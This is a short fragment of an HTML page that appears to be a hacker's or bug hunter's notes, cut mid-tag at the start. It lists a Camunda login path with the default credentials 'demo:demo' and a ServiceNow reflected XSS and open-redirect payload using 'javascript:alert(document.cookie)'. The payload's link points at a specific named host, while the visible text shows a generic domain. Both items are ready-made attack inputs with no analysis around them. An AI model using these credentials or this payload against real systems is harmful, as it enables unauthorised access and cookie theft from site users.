id="04439141-e4f5-43cd-96b2-7b4d59001a9f" class="" dir="auto">/camunda/app/welcome/default/#!/login</p><p id="a3de020d-c41c-4020-8225-420d7fc75e4a" class="" dir="auto">default pass : demo:demo</p></div></details><details id="0057cbd6-0a72-40ed-9411-099846ce3e9f" open="" class="toggle" dir="auto"><summary>Servicenow</summary><div class="indented"><ol type="1" id="d208dfd0-a664-458c-af99-c903d19dd5ff" class="numbered-list" start="1" dir="auto"><li>RXSS &amp; open redirect : <a href="https://servicenowuat.ice.com/auth_redirect.do?sysparm_stack=no&amp;sysparm_url=javascript:alert(document.cookie)">https://domain.com/auth_redirect.do?sysparm_stack=no&amp;sysparm_url=javascript:alert(document.cookie)</a></li></ol></div></details></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
